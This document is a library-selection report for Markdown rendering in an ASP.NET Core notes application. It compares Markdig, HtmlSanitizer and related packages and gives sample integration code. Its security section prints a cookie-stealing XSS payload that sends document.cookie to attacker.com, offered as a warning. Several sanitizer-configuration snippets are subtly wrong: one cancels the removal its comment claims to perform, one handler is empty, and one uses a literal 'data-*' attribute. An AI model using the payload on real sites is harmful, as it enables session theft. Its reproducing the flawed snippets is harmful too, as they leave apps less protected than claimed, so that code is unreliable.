# .NET Markdown Package Research for Hamco

**Research Date:** 2026-02-08  
**Purpose:** Select best Markdown processing stack for ASP.NET Core MVC/Razor Pages  
**Requirements:**
1. Render Markdown to HTML
2. Syntax highlighting for code blocks
3. XSS protection via HTML sanitization (CRITICAL)
4. GitHub-flavored Markdown (tables, strikethrough, task lists)
5. ASP.NET Core compatibility
6. Good performance
7. Active maintenance

---

## Executive Summary

**RECOMMENDED STACK:** **Markdig + Markdown.ColorCode + HtmlSanitizer**

This combination provides the best balance of features, performance, security, and maintainability for Hamco's note-taking application.

---

## Library Comparison

### 1. Markdig ⭐ WINNER

| Metric | Value |
|--------|-------|
| **NuGet Downloads** | 70M+ total; ~670K per recent version |
| **GitHub Stars** | 4,000+ |
| **Current Version** | 0.44.0 (Nov 25, 2025) |
| **License** | BSD-Clause 2 |
| **Dependencies** | System.Memory only |
| **Maintained By** | Alexandre Mutel (xoofx) - Microsoft employee |

#### Features
- ✅ **CommonMark compliant** (600+ spec tests passing, version 0.31.2)
- ✅ **GitHub Flavored Markdown** - pipe tables, task lists, strikethrough, fenced code blocks
- ✅ **Extremely fast** - ~100x faster than MarkdownSharp, 20% faster than C reference implementation
- ✅ **Extensible architecture** - 20+ built-in extensions
- ✅ **Abstract Syntax Tree** with precise source locations
- ✅ **Roundtrip support** - lossless parse → render
- ✅ **No regex** - pure parser, low GC pressure
- ✅ **Used by major projects** - Umbraco, Microsoft Semantic Kernel, .NET MAUI, Playnite, nopCommerce, OrchardCore, etc.

#### Built-in Extensions
- Pipe tables (GitHub style) & Grid tables
- Task lists (`- [x] Task`)
- Strikethrough (`~~text~~`)
- Auto-links (URLs become clickable)
- Footnotes
- Definition lists
- Emoji support
- Mathematics/LaTeX
- YAML Front Matter
- Mermaid & nomnoml diagram support
- Media embeds (YouTube, Vimeo)
- And more...

#### Security Note
Markdig does NOT sanitize HTML by default - you MUST pair with HtmlSanitizer for XSS protection.

---

### 2. HtmlSanitizer (Ganss.XSS) ⭐ WINNER - Sanitization

| Metric | Value |
|--------|-------|
| **NuGet Downloads** | 50M+ |
| **Current Version** | 9.0.892 |
| **License** | MIT |
| **Maintained By** | Michael Ganss |

#### Features
- ✅ **XSS protection** - removes dangerous constructs
- ✅ **AngleSharp-based** - robust HTML/CSS parsing
- ✅ **Configurable allowlists** - tags, attributes, CSS properties
- ✅ **URI scheme validation** - prevents javascript: URLs
- ✅ **Thread-safe** - share single instance across threads
- ✅ **Online demo** available at xss.ganss.org

#### Default Allowed Tags (relevant subset)
`p`, `br`, `strong`, `em`, `code`, `pre`, `blockquote`, `ul`, `ol`, `li`, `h1-h6`, `a`, `img`, `table`, `thead`, `tbody`, `tr`, `td`, `th`, `div`, `span`, `del`, `ins`, `sup`, `sub`, `hr`

**Note:** `class` attribute is disallowed by default (prevents classjacking attacks). Add manually if needed for styling.

---

### 3. Markdown.ColorCode ⭐ RECOMMENDED - Syntax Highlighting

| Metric | Value |
|--------|-------|
| **NuGet Package** | `Markdown.ColorCode` |
| **Version** | 3.0.1 |
| **License** | MIT |
| **Maintained By** | William Baldoumas |

#### Features
- ✅ Markdig extension for server-side syntax highlighting
- ✅ Powered by ColorCode-Universal (Community Toolkit)
- ✅ No JavaScript required - pure server-side rendering
- ✅ Customizable style dictionaries
- ✅ Additional language support
- ✅ Improved C# highlighting available via `Markdown.ColorCode.CSharpToColoredHtml`

---

### 4. CommonMark.NET ❌ DEPRECATED

| Metric | Value |
|--------|-------|
| **Status** | **NO LONGER MAINTAINED** |
| **Last Activity** | 2017-2018 |
| **Author's Recommendation** | "If you find it does not meet your needs, you might want to check out Markdig" |

**Verdict:** Do not use. The author explicitly recommends Markdig.

---

### 5. MarkdownSharp ❌ NOT RECOMMENDED

| Metric | Value |
|--------|-------|
| **Origin** | Stack Overflow's original Markdown processor |
| **Performance** | 100x slower than Markdig |
| **Architecture** | Regex-based (fragile, problematic) |
| **CommonMark** | Non-compliant |

**Verdict:** Legacy library. Markdig is superior in every way.

---

## Top 3 Recommendation Summary

### Option 1: RECOMMENDED - Markdig + Markdown.ColorCode + HtmlSanitizer
**Best for:** Production applications requiring full GFM support, syntax highlighting, and security

**Pros:**
- Complete feature set
- Best-in-class performance
- Active maintenance
- XSS-safe when combined with HtmlSanitizer
- Server-side rendering (no JS dependencies)

**Cons:**
- Three packages to manage
- Slightly more complex setup

---

### Option 2: Markdig + HtmlSanitizer (without ColorCode)
**Best for:** Applications that handle client-side syntax highlighting (e.g., with Prism.js or highlight.js)

**Pros:**
- Simpler dependency graph
- Lighter server load
- Can use any JS syntax highlighter frontend
- Still XSS-safe

**Cons:**
- Requires client-side JavaScript for code coloring
- SEO: uncolored code in initial HTML

---

### Option 3: Markdig Only (for trusted content only)
**Best for:** Internal/admin tools where input is 100% trusted

**Pros:**
- Single dependency
- Simplest setup
- Maximum performance

**Cons:**
- **NO XSS PROTECTION** - only safe for trusted input
- No syntax highlighting

---

## Clear Winner: Markdig + Markdown.ColorCode + HtmlSanitizer

### Justification

1. **Performance:** Markdig is the fastest .NET Markdown parser available (benchmarked against C reference)
2. **Compatibility:** Supports .NET 6+ (Hamco target) through .NET Standard 2.0/2.1 and native .NET 8/9
3. **Features:** Native GFM support including tables, task lists, strikethrough without plugins
4. **Ecosystem:** 480+ dependent packages, used by Microsoft projects (Semantic Kernel, .NET MAUI)
5. **Security:** HtmlSanitizer is the industry standard for XSS protection in .NET
6. **Maintenance:** Both libraries actively maintained with recent releases
7. **Integration:** Works seamlessly with ASP.NET Core Razor views via `@Html.Raw()` or custom helpers

---

## Sample Implementation

### 1. Install NuGet Packages

```bash
dotnet add package Markdig
dotnet add package Markdown.ColorCode
dotnet add package HtmlSanitizer
```

### 2. Create Markdown Service

```csharp
using Markdig;
using Markdig.SyntaxHighlighting;
using Ganss.XSS;
using Microsoft.AspNetCore.Html;

namespace Hamco.Services
{
    public interface IMarkdownService
    {
        IHtmlContent ToHtml(string markdown);
        string ToHtmlString(string markdown);
    }

    public class MarkdownService : IMarkdownService
    {
        private readonly MarkdownPipeline _pipeline;
        private readonly HtmlSanitizer _sanitizer;

        public MarkdownService()
        {
            // Configure Markdig pipeline with GFM and syntax highlighting
            _pipeline = new MarkdownPipelineBuilder()
                .UseAdvancedExtensions()  // Tables, task lists, strikethrough, auto-links, etc.
                .UseColorCode()           // Syntax highlighting via ColorCode
                .Build();

            // Configure HtmlSanitizer for XSS protection
            _sanitizer = new HtmlSanitizer();
            
            // Optional: Add class attribute if you need CSS styling
            // _sanitizer.AllowedAttributes.Add("class");
            
            // Optional: Allow mailto: links
            // _sanitizer.AllowedSchemes.Add("mailto");
        }

        /// <summary>
        /// Converts Markdown to safe HTML for Razor views
        /// </summary>
        public IHtmlContent ToHtml(string markdown)
        {
            if (string.IsNullOrWhiteSpace(markdown))
                return new HtmlString(string.Empty);

            // Step 1: Parse Markdown to HTML
            var rawHtml = Markdig.Markdown.ToHtml(markdown, _pipeline);

            // Step 2: Sanitize to prevent XSS
            var safeHtml = _sanitizer.Sanitize(rawHtml);

            return new HtmlString(safeHtml);
        }

        /// <summary>
        /// Converts Markdown to safe HTML string (for APIs, etc.)
        /// </summary>
        public string ToHtmlString(string markdown)
        {
            if (string.IsNullOrWhiteSpace(markdown))
                return string.Empty;

            var rawHtml = Markdig.Markdown.ToHtml(markdown, _pipeline);
            return _sanitizer.Sanitize(rawHtml);
        }
    }
}
```

### 3. Register in Program.cs

```csharp
using Hamco.Services;

var builder = WebApplication.CreateBuilder(args);

// Register Markdown service as singleton (it's thread-safe)
builder.Services.AddSingleton<IMarkdownService, MarkdownService>();

// Add controllers with views
builder.Services.AddControllersWithViews();

var app = builder.Build();
// ... rest of configuration
```

### 4. Use in Razor View

```html
@model Hamco.Models.Note
@inject Hamco.Services.IMarkdownService Markdown

<div class="note-content">
    @Markdown.ToHtml(Model.Content)
</div>
```

### 5. Custom HtmlHelper Extension (Optional)

```csharp
using Microsoft.AspNetCore.Html;
using Microsoft.AspNetCore.Mvc.Rendering;

namespace Hamco.Helpers
{
    public static class MarkdownHelpers
    {
        public static IHtmlContent Markdown(this IHtmlHelper helper, string markdown)
        {
            var service = helper.ViewContext.HttpContext.RequestServices
                .GetRequiredService<IMarkdownService>();
            return service.ToHtml(markdown);
        }
    }
}
```

Usage:
```html
@using Hamco.Helpers

<div class="note-content">
    @Html.Markdown(Model.Content)
</div>
```

### 6. CSS for Code Highlighting

Add ColorCode styles to your `site.css` or as a separate file:

```css
/* ColorCode Syntax Highlighting Styles */
.code {
    background-color: #f4f4f4;
    border: 1px solid #ddd;
    border-radius: 4px;
    padding: 16px;
    overflow-x: auto;
}

.code .comment { color: #008000; }
.code .keyword { color: #0000ff; }
.code .string { color: #a31515; }
.code .number { color: #098658; }
.code .type { color: #2b91af; }
.code .identifier { color: #1f1f1f; }
/* ... additional token styles as needed */
```

---

## Security Considerations

### Critical: Always Sanitize

Markdig renders raw HTML that may be present in Markdown. Without sanitization, this creates XSS vulnerabilities:

```markdown
<!-- This is valid Markdown that could steal cookies -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**ALWAYS run HtmlSanitizer on the output before rendering to the browser.**

### HtmlSanitizer Configuration Tips

```csharp
// For Hamco notes, you likely want these configurations:

var sanitizer = new HtmlSanitizer();

// Allow class attributes for styling (but be aware of classjacking)
sanitizer.AllowedAttributes.Add("class");

// Allow data-* attributes if needed for frontend functionality
sanitizer.AllowedAttributes.Add("data-*");

// Restrict target="_blank" links to prevent tabnabbing
sanitizer.RemovingAttribute += (sender, e) =>
{
    if (e.Attribute.Name == "target" && e.Attribute.Value == "_blank")
    {
        e.Cancel = true; // Remove target="_blank"
    }
};

// Add rel="noopener noreferrer" to external links
sanitizer.FilterUrl += (sender, e) =>
{
    if (e.OriginalUrl != null && 
        (e.OriginalUrl.StartsWith("http://") || e.OriginalUrl.StartsWith("https://")))
    {
        // Add security attributes to external links
        // (requires custom post-processing or custom link handling)
    }
};
```

---

## Performance Notes

### Benchmarks (from Markdig repository)

| Library | Mean | Relative Speed |
|---------|------|----------------|
| Markdig | 1.979 ms | 1x (baseline) |
| cmark (C ref) | 2.571 ms | 1.3x slower |
| CommonMark.NET | 2.016 ms | 1.02x slower |
| MarkdownSharp | 221.455 ms | **112x slower** |

### Recommendations

1. **Singleton Service:** Register `IMarkdownService` as singleton (both Markdig pipeline and HtmlSanitizer are thread-safe after configuration)
2. **Caching:** For frequently accessed notes, cache the sanitized HTML output
3. **Lazy Loading:** Don't render Markdown in list views - show plain text preview or truncated rendered version

---

## Alternative: Client-Side Syntax Highlighting

If you prefer client-side highlighting (Prism.js, highlight.js), skip Markdown.ColorCode:

```csharp
_pipeline = new MarkdownPipelineBuilder()
    .UseAdvancedExtensions()
    // .UseColorCode()  // <-- Skip this
    .Build();
```

Then in your layout:
```html
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-csharp.min.js"></script>
```

Pros: Smaller HTML payload, customizable themes  
Cons: Requires JavaScript, flash of unstyled content

---

## Conclusion

**Use:** `Markdig` + `Markdown.ColorCode` + `HtmlSanitizer`

This stack provides:
- ✅ Complete GFM feature support
- ✅ Server-side syntax highlighting
- ✅ XSS protection
- ✅ Excellent performance
- ✅ Active maintenance
- ✅ Production-ready (used by major projects)

**Next Steps:**
1. Add NuGet packages
2. Implement `IMarkdownService` as shown above
3. Register as singleton in DI container
4. Inject into controllers/views
5. Add CSS styling for code blocks
6. Test with various Markdown inputs including edge cases

---

## References

- Markdig: https://github.com/xoofx/markdig
- Markdig NuGet: https://www.nuget.org/packages/Markdig/
- Markdown.ColorCode: https://github.com/wbaldoumas/markdown-colorcode
- HtmlSanitizer: https://github.com/mganss/HtmlSanitizer
- CommonMark Spec: https://spec.commonmark.org/
- HtmlSanitizer Demo: https://xss.ganss.org/
